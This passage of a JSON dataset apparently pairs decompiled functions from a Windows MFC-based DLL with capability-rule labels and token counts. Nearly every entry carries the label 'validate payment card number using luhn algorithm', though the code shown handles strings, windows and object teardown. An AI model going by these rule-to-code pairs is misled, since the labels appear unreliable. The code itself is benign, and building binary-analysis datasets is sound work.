        "decompiled_code": "\nvoid fcn.180008dc8(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong in_RDX;\n    \n    iVar2 = fcn.1800342b8(*arg1, in_RDX);\n    if (iVar2 == 0) {\n        fcn.180001214(0x8007000e);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *arg1 = iVar2;\n    return;\n}\n",
        "token_count": 116
    },
    "180008df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008dfc(int64_t *arg1, int64_t arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t arg2_00;\n    int64_t arg4;\n    uint64_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = arg3;\n    if (iVar5 == 0) {\n        fcn.1800089e0(arg1, arg2, arg3);\n    }\n    else {\n        if (arg2 == 0) {\n            fcn.180001214(0x80070057);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        iVar2 = *arg1;\n        uVar1 = *(iVar2 + -0x10);\n        uVar4 = arg2 - iVar2 >> 1;\n        if ((1U - *(iVar2 + -8) | *(iVar2 + -0xc) - iVar5) < 0) {\n            fcn.180008ed0(arg1, arg3 & 0xffffffff);\n        }\n        iVar2 = *arg1;\n        arg2_00 = *(iVar2 + -0xc) * 2;\n        arg4 = iVar5 * 2;\n        if (uVar1 < uVar4) {\n            fcn.180034220(iVar2, arg2_00, arg2, arg4);\n        }\n        else {\n            fcn.180033080(iVar2, arg2_00, iVar2 + uVar4 * 2, arg4);\n        }\n        if ((iVar5 < 0) || (*(*arg1 + -0xc) < iVar5)) {\n            fcn.180001214(0x80070057);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        *(*arg1 + -0x10) = iVar5;\n        *(arg4 + *arg1) = 0;\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "180008f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008f94(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    uVar1 = *(*arg1 + -0x10);\n    uVar5 = arg2 - *arg1 >> 1;\n    iVar3 = 0;\n    if (arg3 < 0) {\n        fcn.180001214(0x80070057);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 != 0) {\n        iVar3 = fcn.180033b84(arg2);\n    }\n    if (iVar3 < arg3) {\n        arg3._0_4_ = iVar3;\n    }\n    if (uVar1 <= 0x7fffffff - arg3) {\n        uVar4 = uVar1 + arg3;\n        if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar4) < 0) {\n            fcn.180008ed0(arg1, uVar4);\n        }\n        if (uVar5 <= uVar1) {\n            arg2 = *arg1 + uVar5 * 2;\n        }\n        fcn.180034220(*arg1 + uVar1 * 2, arg3 * 2, arg2, arg3 * 2);\n        if ((-1 < uVar4) && (uVar4 <= *(*arg1 + -0xc))) {\n            *(*arg1 + -0x10) = uVar4;\n            *(*arg1 + uVar4 * 2) = 0;\n            return;\n        }\n        fcn.180001214(0x80070057);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    fcn.180001214(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 467
    },
    "1800090a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800090a8(int64_t *arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t arg3;\n    code *pcVar3;\n    int64_t arg2_00;\n    ulong *puVar4;\n    int64_t iVar5;\n    \n    arg3 = *arg1;\n    iVar2 = *(arg3 + -0x10);\n    puVar4 = (**(**(arg3 + -0x18) + 0x20))();\n    iVar5 = (***puVar4)(puVar4, arg2, 2);\n    if (iVar5 == 0) {\n        fcn.180009098();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    if (iVar2 < arg2) {\n        arg2._0_4_ = iVar2;\n    }\n    arg2_00 = (arg2 + 1) * 2;\n    fcn.180034220(iVar5 + 0x18, arg2_00, arg3, arg2_00);\n    *(iVar5 + 8) = iVar2;\n    LOCK();\n    piVar1 = arg3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(arg3 + -0x18) + 8))(*(arg3 + -0x18), arg3 + -0x18);\n    }\n    *arg1 = iVar5 + 0x18;\n    return;\n}\n",
        "token_count": 363
    },
    "18000915": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009158(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    if ((*(*arg1 + -0xc) < arg2) && (0 < arg2)) {\n        iVar2 = (**(**(*arg1 + -0x18) + 0x10))();\n        if (iVar2 == 0) {\n            fcn.180009098();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        *arg1 = iVar2 + 0x18;\n        return;\n    }\n    fcn.180009098();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 165
    },
    "1800091a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800091a4(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    fcn.1800091c8(noname_0, arg2, &uStackX24);\n    return;\n}\n",
        "token_count": 90
    },
    "1800091c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800091c8(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (arg2 == 0) {\n        fcn.180001214(0x80070057);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar2 = fcn.180033414(arg2, arg3);\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar2) < 0) {\n        fcn.180008ed0(arg1, uVar2);\n    }\n    fcn.180033a0c(*arg1, uVar2 + 1, arg2, arg3);\n    if ((-1 < uVar2) && (uVar2 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar2;\n        *(*arg1 + uVar2 * 2) = 0;\n        return;\n    }\n    fcn.180001214(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 276
    },
    "18000966": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180009660(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    while( true ) {\n        iVar2 = fcn.18003346c(arg1);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if (*0x180066000 == NULL) break;\n        iVar1 = (**0x180066000)(arg1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "180009a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180009a6c(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.180014058();\n    *(arg1 + 0x38) = uVar1;\n    *(arg1 + 8) = 1;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x28) = 1;\n    return arg1;\n}\n",
        "token_count": 141
    },
    "180009ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009ac8(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    // WARNING: Could not recover jumptable at 0x000180009ae1. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(iVar1 + 8) + 0x138))(*(iVar1 + 8), 1);\n    return;\n}\n",
        "token_count": 96
    },
    "180009ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009ae8(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    // WARNING: Could not recover jumptable at 0x000180009aff. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(iVar1 + 8) + 0x138))(*(iVar1 + 8), 0xffffffff);\n    return;\n}\n",
        "token_count": 96
    },
    "18000a24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a244(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.18003342c(*arg1);\n        *arg1 = 0;\n    }\n    *(arg1 + 1) = 0;\n    *(arg1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 78
    },
    "18000a43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a430(int64_t **arg1)\n\n{\n    if (*arg1 != NULL) {\n        (**(**arg1 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 44
    },
    "18000a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000a448(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    \n    iVar1 = *(arg1 + 0x1e8);\n    if ((0 < iVar1) && (arg2 == 0)) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        uVar4 = (*pcVar2)();\n        return uVar4;\n    }\n    iVar6 = 0;\n    iVar5 = 0;\n    if (0 < iVar1) {\n        do {\n            if ((iVar5 < 0) || (*(arg1 + 0x1e8) <= iVar6)) {\n                (*_sym.imp.KERNEL32.dll_RaiseException)(0xc000008c, 1, 0);\n                pcVar2 = swi(3);\n                uVar4 = (*pcVar2)();\n                return uVar4;\n            }\n            iVar3 = fcn.180034e80(arg2, *(*(*(arg1 + 0x1e0) + iVar5 * 8) + 8));\n            if (iVar3 == 0) {\n                return 1;\n            }\n            iVar5 = iVar5 + 1;\n            iVar6 = iVar6 + 1;\n        } while (iVar5 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 329
    },
    "18000af8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.18000af80(code **arg1, ulong arg2, code *arg3)\n\n{\n    fcn.180024d30(arg1, arg2);\n    arg1[0x31] = arg3;\n    arg1[0x30] = vtable.CBrowserControlSite.1.0;\n    *arg1 = vtable.CBrowserControlSite.0;\n    return arg1;\n}\n",
        "token_count": 91
    },
    "18000b29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000b294(int64_t arg1)\n\n{\n    *(arg1 + 0x120) = 0;\n    *(arg1 + 0x124) = 0;\n    *(arg1 + 0x200) = 0xc;\n    if (*(arg1 + 0x110) != NULL) {\n        (**(**(arg1 + 0x110) + 0x10))();\n        *(arg1 + 0x110) = 0;\n    }\n    *(arg1 + 0x1d8) = 0;\n    *(arg1 + 0x100) = 0;\n    *(arg1 + 0x108) = 0;\n    return;\n}\n",
        "token_count": 157
    },
    "18000b3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000b3a8(uint64_t *arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    code *pcVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    uint32_t uVar6;\n    \n    iVar1 = *(arg1 + 0xc);\n    if (*(arg1 + 1) == iVar1) {\n        puVar2 = *arg1;\n        if ((puVar2 <= arg2) && (arg2 < puVar2 + iVar1)) {\n            fcn.180001214(0x80004005);\n            pcVar3 = swi(3);\n            uVar4 = (*pcVar3)();\n            return uVar4;\n        }\n        if (iVar1 == 0) {\n            uVar6 = 1;\ncode_r0x00018000b3fc:\n            uVar5 = fcn.1800355ac(puVar2, uVar6, 8);\n            if (uVar5 != 0) {\n                *(arg1 + 0xc) = uVar6;\n                *arg1 = uVar5;\n                goto code_r0x00018000b418;\n            }\n        }\n        else {\n            uVar6 = *(arg1 + 1) * 2;\n            if ((-1 < uVar6) && (uVar6 < 0x10000000)) goto code_r0x00018000b3fc;\n        }\n        uVar4 = 0;\n    }\n    else {\ncode_r0x00018000b418:\n        puVar2 = *arg1 + *(arg1 + 1) * 8;\n        if (puVar2 != NULL) {\n            *puVar2 = *arg2;\n        }\n        *(arg1 + 1) = *(arg1 + 1) + 1;\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 429
    },
    "18000b4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.18000b4fc(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t *piStackX8;\n    int64_t *piStackX32;\n    \n    if (arg1 == NULL) {\n        iVar1 = -0x7ff8ffa9;\n    }\n    else {\n        piStackX32 = NULL;\n        piStackX8 = NULL;\n        iVar1 = (***arg1)(arg1, 0x18004d3f8, &piStackX32);\n        if ((-1 < iVar1) && (iVar1 = (**(*piStackX32 + 0x20))(piStackX32, arg2, &piStackX8),  -1 < iVar1)) {\n            iVar1 = (**(*piStackX8 + 0x30))(piStackX8, arg3);\n        }\n        if (piStackX8 != NULL) {\n            (**(*piStackX8 + 0x10))();\n        }\n        if (piStackX32 != NULL) {\n            (**(*piStackX32 + 0x10))();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 262
    },
    "18000bd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000bd50(code **arg1)\n\n{\n    *arg1 = vtable.CDHtmlControlSink.0;\n    if (*(arg1 + 2) != 0) {\n        fcn.18000b4fc(arg1[3], arg1 + 4, *(arg1 + 2));\n    }\n    if (arg1[9] != NULL) {\n        (**(*arg1[9] + 0x10))();\n    }\n    if (arg1[3] != NULL) {\n        (**(*arg1[3] + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "18000c0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.18000c0ec(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = (**(*(arg1 + 0xe8) + 0x38))();\n    if (iVar4 != 0) {\n        iVar5 = 0;\n        if (0 < *(arg1 + 0x1f8)) {\n            iVar4 = 0;\n            do {\n                if ((iVar4 < 0) || (*(arg1 + 0x1f8) <= iVar5)) {\n                    (*_sym.imp.KERNEL32.dll_RaiseException)(0xc000008c, 1, 0, 0);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                piVar1 = *(*(arg1 + 0x1f0) + iVar4);\n                fcn.18000b4fc(piVar1[2], 0x180056018, *(piVar1 + 3));\n                (**(*piVar1 + 0x38))(piVar1);\n                iVar5 = iVar5 + 1;\n                iVar4 = iVar4 + 8;\n            } while (iVar5 < *(arg1 + 0x1f8));\n        }\n        if (*(arg1 + 0x1f0) != 0) {\n            fcn.18003342c(*(arg1 + 0x1f0));\n            *(arg1 + 0x1f0) = 0;\n        }\n        *(arg1 + 0x1f8) = 0;\n        *(arg1 + 0x1fc) = 0;\n        iVar5 = 0;\n        if (0 < *(arg1 + 0x1e8)) {\n            iVar4 = 0;\n            do {\n                if ((iVar4 < 0) || (*(arg1 + 0x1e8) <= iVar5)) {\n                    (*_sym.imp.KERNEL32.dll_RaiseException)(0xc000008c, 1, 0, 0);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                iVar2 = *(arg1 + 0x1e0);\n                fcn.18000b4fc(*(*(iVar2 + iVar4) + 0x18), *(iVar4 + iVar2) + 0x20, *(*(iVar4 + iVar2) + 0x10));\n                if (*(arg1 + 0x1e8) <= iVar5) {\n                    (*_sym.imp.KERNEL32.dll_RaiseException)(0xc000008c, 1, 0, 0);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                piVar1 = *(iVar4 + *(arg1 + 0x1e0));\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x38))();\n                }\n                iVar5 = iVar5 + 1;\n                iVar4 = iVar4 + 8;\n            } while (iVar5 < *(arg1 + 0x1e8));\n        }\n        if (*(arg1 + 0x1e0) != 0) {\n            fcn.18003342c(*(arg1 + 0x1e0));\n            *(arg1 + 0x1e0) = 0;\n        }\n        *(arg1 + 0x1e8) = 0;\n        *(arg1 + 0x1ec) = 0;\n    }\n    return;\n}\n",
        "token_count": 806
    },
    "180017b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017b40(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x000180017b8a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 0x230))(arg1, *(iVar2 + 0xa0), *(iVar2 + 0xa8), *(iVar2 + 0xb0));\n    return;\n}\n",
        "token_count": 178
    },
    "18000d75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d750(int64_t arg1, int64_t arg2)\n\n{\n    if (arg2 == *(arg1 + 0x110)) {\n        fcn.18000d414(arg1, 0xe8);\n        fcn.180017288(arg1, 0);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "18000d78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d784(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong in_stack_00000028;\n    \n    fcn.18000d13c(noname_0, arg3, arg4, in_stack_00000028);\n    return;\n}\n",
        "token_count": 70
    },
    "18000db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000db00(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180010ad4();\n    if ((iVar1 != 0) && (*(iVar1 + 0x78) != NULL)) {\n        (**(iVar1 + 0x78))(1, 1);\n    }\n    // WARNING: Could not recover jumptable at 0x00018000db2b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_PostQuitMessage)(arg1);\n    return;\n}\n",
        "token_count": 131
    },
    "18000e79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000e79c(code **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uchar auStack1128 [56];\n    code **ppcStack1072;\n    ulong uStack1056;\n    uint64_t uStack24;\n    \n    uStack1056 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack1128;\n    *arg1 = vtable.CWinApp.0;\n    piVar1 = arg1[0x16];\n    ppcStack1072 = arg1;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    piVar1 = arg1[0x22];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x30))(piVar1, 1);\n    }\n    iVar2 = fcn.180014058();\n    if (*(iVar2 + 0x28) == '\\0') {\n        if (*0x180069950 != NULL) {\n            (**(**0x180069950 + 8))(*0x180069950, 1);\n            *0x180069950 = NULL;\n        }\n        if (*0x180069948 != NULL) {\n            (**(**0x180069948 + 8))(*0x180069948, 1);\n            *0x180069948 = NULL;\n        }\n    }\n    if (arg1[0x1c] != NULL) {\n        fcn.18001cc28(arg1[0x1c]);\n    }\n    if (arg1[0x1d] != NULL) {\n        fcn.18001cc28(arg1[0x1d]);\n    }\n    if (*(arg1 + 0x24) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)();\n    }\n    if (*(arg1 + 0x122) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)();\n    }\n    piVar1 = arg1[0x23];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    iVar2 = fcn.180014058();\n    if (*(iVar2 + 0x20) == arg1[0x14]) {\n        *(iVar2 + 0x20) = 0;\n    }\n    if (*(iVar2 + 8) == arg1) {\n        *(iVar2 + 8) = 0;\n    }\n    fcn.18003342c(arg1[0x14]);\n    fcn.18003342c(arg1[0x15]);\n    fcn.18003342c(arg1[0x18]);\n    fcn.18003342c(arg1[0x19]);\n    fcn.18003342c(arg1[0x1a]);\n    arg1[0xb] = NULL;\n    fcn.180010bc4(arg1);\n    fcn.180032ea0(uStack24 ^ auStack1128);\n    return;\n}\n",
        "token_count": 686
    },
    "18001cb1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid int.18001cb10(ulong arg1)\n\n{\n    code *pcVar1;\n    ulong var_50h;\n    \n    if (0x10 < arg1) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00018001cb35. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (18 cases) at 0x18004c428\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 * 0x28 + 0x18006cf40);\n    return;\n}\n",
        "token_count": 154
    },
    "18000ed2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000ed24(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    iVar4 = arg1;\n    if (arg1 != 0) goto code_r0x00018000ed89;\n    iVar4 = fcn.180013824();\n    if (*(iVar4 + 0x1b8) == 0) {\n        piVar5 = fcn.180010ad4();\n        if (piVar5 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (**(*piVar5 + 0xe8))(piVar5);\n        }\n        if (iVar4 == 0) {\n            iVar4 = 0;\n            iVar6 = iVar4;\n            iVar7 = iVar4;\n            goto joined_r0x00018000edb7;\n        }\n        iVar4 = *(iVar4 + 0x40);\n    }\n    else {\n        iVar4 = *(*(iVar4 + 0x1b8) + 0x40);\n    }\n    for (; iVar6 = iVar4,  iVar7 = iVar4,  iVar4 != 0; iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar4)) {\ncode_r0x00018000ed89:\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongW)(iVar4, 0xfffffff0);\n        iVar6 = iVar4;\n        iVar7 = iVar4;\n        if ((uVar2 >> 0x1e & 1) == 0) break;\n    }\njoined_r0x00018000edb7:\n    while (iVar1 = iVar6,  iVar1 != 0) {\n        iVar6 = (*_sym.imp.USER32.dll_GetParent)(iVar1);\n        iVar4 = iVar1;\n    }\n    if ((arg1 == 0) && (iVar7 != 0)) {\n        iVar7 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar7);\n    }\n    if (arg2 != NULL) {\n        if (((iVar4 == 0) || (iVar3 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar4),  iVar3 == 0)) || (iVar4 == iVar7))\n        {\n            *arg2 = 0;\n        }\n        else {\n            *arg2 = iVar4;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar4, 0);\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 585
    },
    "18000efb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000efb8(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    if (*(iVar1 + 8) == NULL) {\n        fcn.18000ee30(0, arg1, arg2 & 0xffffffff, arg3 & 0xffffffff);\n    }\n    else {\n        (**(**(iVar1 + 8) + 0x130))();\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "18000f0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.18000f0f4(int64_t *arg1, int64_t arg2, int64_t *arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    \n    piVar3 = NULL;\n    uVar2 = 0;\n    if (*(*arg3 + -0x18) != NULL) {\n        piVar3 = (**(**(*arg3 + -0x18) + 0x20))();\n    }\n    if (piVar3 == NULL) {\n        piVar3 = fcn.180012330();\n        piVar3 = (**(*piVar3 + 0x20))();\n    }\n    if (piVar3 != NULL) {\n        iVar4 = (**(*piVar3 + 0x18))(piVar3);\n        *arg1 = iVar4 + 0x18;\n        iVar4 = *arg3;\n        if (arg2 != 0) {\n            uVar2 = fcn.180033b84(arg2);\n        }\n        fcn.180008cd4(arg1, arg2, uVar2, iVar4);\n        return arg1;\n    }\n    fcn.180001214(0x80004005);\n    pcVar1 = swi(3);\n    piVar3 = (*pcVar1)();\n    return piVar3;\n}\n",
        "token_count": 310
    },
    "18000f63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18000f638(int64_t arg1, ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    \n    if (arg2 == 0) {\n        puVar2 = arg1 + 0x12;\n    }\n    else {\n        puVar2 = arg1 + 0x18;\n    }\n    if (*puVar2 == 0xffff) {\n        puVar2 = puVar2 + 2;\n    }\n    else {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (uVar1 != 0);\n    }\n    if (*puVar2 == 0xffff) {\n        puVar2 = puVar2 + 2;\n    }\n    else {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (uVar1 != 0);\n    }\n    uVar1 = *puVar2;\n    if ((uVar1 != 0) && (arg2 == 0)) {\n        uVar1 = uVar1 - 2;\n    }\n    return uVar1 + 5 + puVar2 & 0xfffffffffffffffc;\n}\n",
        "token_count": 280
    },
    "18000fa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
